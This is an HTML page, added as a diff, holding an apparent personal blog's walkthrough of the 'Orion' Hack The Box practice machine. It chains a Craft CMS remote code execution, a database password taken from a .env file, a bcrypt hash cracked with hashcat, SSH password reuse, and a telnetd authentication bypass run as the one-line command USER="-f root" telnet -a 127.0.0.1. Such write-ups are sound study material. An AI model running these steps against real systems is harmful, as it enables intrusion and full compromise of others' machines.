@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Orion // Lab Report // crimson</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="../favicon.svg">
+<link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+
+<div class="grid-bg"></div>
+<div class="glow"></div>
+<div class="crt-overlay" aria-hidden="true"></div>
+
+<header class="site">
+  <nav>
+    <div class="logo glitch">~/<span>crimson</span>▋</div>
+    <div class="navlinks">
+      <a href="../index.html">Home</a>
+      <a href="../blog.html">Blog</a>
+      <a href="../reports.html" class="active">Lab Reports</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../projects.html">Projects</a>
+      <a href="../aboutme.html">About Me</a>
+    </div>
+    <div class="nav-status"><span class="status-dot"></span>online</div>
+  </nav>
+</header>
+
+<main>
+
+  <section class="page-head reveal visible" style="border-bottom:none;padding-bottom:0;">
+    <a href="../reports.html" class="back-link">← ls reports/</a>
+    <div class="eyebrow scramble">cat orion.md</div>
+    <h1 class="page-title scramble glitch glow-heading">Orion</h1>
+    <div class="writeup-meta">
+      <span class="tag">HTB</span><span class="tag diff easy">Easy</span><span class="tag">RCE</span><span class="tag">SSH</span><span class="tag">Credential Abuse</span>
+    </div>
+    <p class="writeup-summary">Orion is an easy Linux machine running Craft CMS 5.6.16. An unauthenticated RCE in Craft CMS provides a shell as www-data, where database credentials can be recovered from the application's environment file. Cracking the Craft admin password provides SSH access as adam, while a locally exposed GNU inetutils telnetd 2.7 service is vulnerable to CVE-2026-24061, allowing a direct root shell.</p>
+    <div class="writeup-date">Solved: July 28, 2026</div>
+  </section>
+
+  <section class="reveal visible">
+    <div class="writeup-body">
+      <h2>Recon</h2>
+      <p>Started with a basic Nmap scan:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">nmap</div></div><div class="term-body"><div><span class="prompt">$</span> nmap -sC -sV -Pn 10.129.x.x</div></div></div>
+      <p>The scan revealed two externally accessible services:</p>
+      <table class="writeup-table"><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>OpenSSH</td></tr><tr><td>80</td><td>HTTP</td><td>nginx</td></tr></tbody></table>
+      <p>The HTTP service redirected to the hostname:</p>
+      <div class="output-block">http://orion.htb/</div>
+      <p>We added the hostname to <code>/etc/hosts</code>:</p>
+      <div class="output-block">10.129.x.x orion.htb</div>
+      <h2>Enumeration</h2>
+      <h3>HTTP - TCP 80</h3>
+      <p>Visiting <code>http://orion.htb/</code> revealed a website belonging to a telecommunications company.</p>
+      <p>The application appeared to be running <span class="hl">Craft CMS</span>.</p>
+      <p>Further enumeration identified the Craft administration panel:</p>
+      <div class="output-block">/admin/login</div>
+      <p>The login page revealed the exact CMS version:</p>
+      <div class="output-block">Craft CMS 5.6.16</div>
+      <p>Craft CMS 5.6.16 was significant because this version is affected by a pre-authentication remote code execution vulnerability, <span class="hl">CVE-2025-32432</span>. The vulnerability affects Craft's image transformation functionality and can be exploited through unsafe object deserialization.</p>
+      <h2>Initial Access</h2>
+      <p>We used the Craft CMS vulnerability to obtain unauthenticated remote code execution on the server.</p>
+      <p>The exploit resulted in command execution as the web server account:</p>
+      <div class="output-block">www-data</div>
+      <p>We verified the account:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">whoami</div></div><div class="term-body"><div><span class="prompt">$</span> whoami</div></div></div>
+      <div class="output-block">www-data</div>
+      <p>With command execution established, we began enumerating the Craft installation.</p>
+      <h3>Craft Configuration</h3>
+      <p>The Craft application contained an environment configuration file:</p>
+      <div class="output-block">.env</div>
+      <p>The file contained credentials used by the Craft installation to access its MariaDB database.</p>
+      <p>The database password was:</p>
+      <div class="output-block">SuperSecureCraft123Pass!</div>
+      <p>The database was running locally, so we could use the credentials to enumerate the application database.</p>
+      <h3>Database Enumeration</h3>
+      <p>We connected to the local MySQL/MariaDB service:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">mysql</div></div><div class="term-body"><div><span class="prompt">$</span> mysql -u root -pSuperSecureCraft123Pass! -h 127.0.0.1</div></div></div>
+      <p>We selected the <code>orion</code> database and enumerated its tables.</p>
+      <p>The <code>users</code> table contained the Craft administrator account:</p>
+      <div class="output-block">username: admin
+email: adam@orion.htb
+password:
+$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS</div>
+      <p>The password was stored as a bcrypt hash.</p>
+      <h3>Password Cracking</h3>
+      <p>We saved the hash locally and used Hashcat with the <code>rockyou.txt</code> wordlist:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">hashcat</div></div><div class="term-body"><div><span class="prompt">$</span> hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</div></div></div>
+      <p>The hash cracked successfully:</p>
+      <div class="output-block">$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel</div>
+      <p>This gave us the password:</p>
+      <div class="output-block">darkangel</div>
+      <p>The email address associated with the Craft account was:</p>
+      <div class="output-block">adam@orion.htb</div>
+      <p>This suggested that the password could potentially be reused for the system account <code>adam</code>.</p>
+      <h2>Privilege Escalation</h2>
+      <p>We tested the recovered credentials over SSH:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">ssh</div></div><div class="term-body"><div><span class="prompt">$</span> ssh adam@orion.htb</div></div></div>
+      <p>Using:</p>
+      <div class="output-block">Username: adam
+Password: darkangel</div>
+      <p>The credentials worked and provided an SSH session as <code>adam</code>.</p>
+      <p>We retrieved the user flag:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">cat</div></div><div class="term-body"><div><span class="prompt">$</span> cat user.txt</div></div></div>
+      <div class="output-block">99ea76b5f7cb1d08acd572b154986b43</div>
+      <p>At this point we had user-level access.</p>
+      <h3>Local Service Enumeration</h3>
+      <p>We then enumerated locally listening services:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">ss</div></div><div class="term-body"><div><span class="prompt">$</span> ss -lntp</div></div></div>
+      <p>Among the services was a Telnet daemon listening only on localhost:</p>
+      <div class="output-block">127.0.0.1:23</div>
+      <p>Because the service was bound to <code>127.0.0.1</code>, it was not visible from our initial external Nmap scan.</p>
+      <p>We checked the Telnet client version:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">telnet</div></div><div class="term-body"><div><span class="prompt">$</span> telnet --version</div></div></div>
+      <p>The system reported:</p>
+      <div class="output-block">telnet (GNU inetutils) 2.7</div>
+      <p>GNU inetutils telnetd 2.7 is affected by <span class="hl">CVE-2026-24061</span>, an authentication-bypass vulnerability involving unsafe handling of the <code>USER</code> environment variable.</p>
+      <h2>Root</h2>
+      <p>The vulnerable Telnet service can be abused by supplying a crafted <code>USER</code> value containing the <code>-f root</code> argument.</p>
+      <p>We connected to the local Telnet service with:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">USER="-f</div></div><div class="term-body"><div><span class="prompt">$</span> USER="-f root" telnet -a 127.0.0.1</div></div></div>
+      <p>The vulnerable Telnet daemon passed the manipulated value to <code>login</code>, causing the <code>-f root</code> option to be interpreted as an instruction to treat the connection as already authenticated for the <code>root</code> account.</p>
+      <p>The connection resulted in a root shell.</p>
+      <p>We verified our privileges:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">id</div></div><div class="term-body"><div><span class="prompt">$</span> id</div></div></div>
+      <div class="output-block">uid=0(root) gid=0(root) groups=0(root)</div>
+      <p>Finally, we retrieved the root flag:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">cat</div></div><div class="term-body"><div><span class="prompt">$</span> cat /root/root.txt</div></div></div>
+      <div class="output-block">[ROOT FLAG]</div>
+      <p>The machine was fully compromised.</p>
+      <h2>Key Takeaways</h2>
+      <ul class="takeaway-list"><li><span class="hl">Enumerate the application before attacking it.</span> Identifying Craft CMS and its exact version revealed a promising attack surface.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Version enumeration matters.</span> Craft CMS 5.6.16 was vulnerable to a pre-authentication RCE.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Check application configuration files after obtaining a web shell.</span> The <code>.env</code> file contained the database password.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Database enumeration can reveal additional credentials.</span> The Craft <code>users</code> table contained the administrator's bcrypt password hash.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Test credential reuse.</span> The cracked <code>darkangel</code> password worked for the <code>adam</code> SSH account.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Enumerate localhost services after gaining a shell.</span> Telnet was bound only to <code>127.0.0.1</code>, so it was invisible from the external scan.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Check versions of unusual local services.</span> GNU inetutils telnetd 2.7 was vulnerable to CVE-2026-24061.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Privilege escalation does not always require a traditional Linux exploit.</span> The Telnet authentication bypass provided direct root access.</li></ul>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site" style="padding-top:0;">
+  <div class="foot-bottom" style="max-width:1100px;margin:0 auto;padding:24px;border-top:1px solid var(--border);">
+    <div>crimson © 2026</div>
+    <div><a href="../reports.html" style="color:var(--text-dim);">← back to Lab Reports</a></div>
+  </div>
+</footer>
+
+<script src="../script.js"></script>
+</body>
+</html>
